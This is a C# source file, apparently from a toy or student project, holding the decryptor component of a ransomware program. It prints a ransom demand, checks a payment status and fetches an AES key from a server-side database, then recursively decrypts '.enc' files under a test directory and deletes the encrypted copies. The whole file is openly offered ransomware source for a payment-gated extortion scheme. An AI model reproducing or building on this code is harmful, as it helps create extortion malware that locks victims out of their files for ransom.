using System;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Globalization;
using System.Security.AccessControl;
using Encryptor;


namespace Decryptor
{
    internal class DecryptorClass
    {
        static List<string> foldersBlacklist = new List<string>() { "Windows", "Program Files", "Program Files (x86)", ".pdf", ".mp4" };
        static string baseDirectory = "c:/test";
        
        
        public static void Main(string[] args)
        {              
            // getting paied
            System.Console.WriteLine("Your feils have been encryptrd! to decrypt them enter the password:");
            string password = System.Console.ReadLine();
            while (password != "password")
            {
                System.Console.WriteLine("Wrong password!");
                password = System.Console.ReadLine();
            }
            System.Console.WriteLine("KEY IS: " + DB.getKey());
            System.Console.WriteLine("Status IS: " + DB.getStatus());
            TryToGetKey();         

            System.Console.WriteLine("Your feils have been decrypted :)");
        }
        
        
        public static void TryToGetKey()
        {
            int status = DB.getStatus();
            if (status == -1)
            {
                // notify user that he has to pay
                System.Console.WriteLine("You havent paied the randsome yet. Hurry before it's too late... ;)");
            }
            else if (status == 1)
            {
                // Decrypt files
                System.Console.WriteLine("Very Smart of you to pay. Your files will now be decrypted...");
                
                AesCryptoServiceProvider decryptAes = getDecryptionCipher();
                decryptAllFiles(baseDirectory, decryptAes);
            }
            else
            {
                System.Console.WriteLine("There has been an error with your status. It is: "+ (status));
            }
        }

        public static void decryptAllFiles(string currentDirectory, AesCryptoServiceProvider aes)
        {

            var currentFiles = Directory.GetFiles(currentDirectory, "*.enc");

            foreach (string filePath in currentFiles)
            {
                decryptFile(filePath, aes);
            }
            var currentDirectories = Directory.GetDirectories(currentDirectory);
            foreach (string directory in currentDirectories)
            {
                decryptAllFiles(directory, aes);
            }

        }

        public static void decryptFile(string filePath, AesCryptoServiceProvider aes)
        {
            //create new file name
            string origname = filePath.Remove(filePath.Length - 4);
            var buffer = new byte[65536];
            using (var streamIn = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            using (var streamOut = new FileStream(origname, FileMode.Create))
            using (var decrypt = new CryptoStream(streamOut, aes.CreateDecryptor(), CryptoStreamMode.Write))
            {
                int bytesRead;
                do
                {
                    bytesRead = streamIn.Read(buffer, 0, buffer.Length);
                    if (bytesRead != 0)
                        decrypt.Write(buffer, 0, bytesRead);
                }
                while (bytesRead != 0);
            }
            File.Delete(filePath);

        }

        /// <summary>
        /// retrives the key from the server
        /// </summary>
        /// <returns></returns>
        public static AesCryptoServiceProvider getDecryptionCipher()
        {
            var aes = new AesCryptoServiceProvider();
            aes.Key =  DB.getKey().Split('-')
                .Select(x => byte.Parse(x, NumberStyles.HexNumber))
                .ToArray();
            aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
            return aes;

        }
    }
}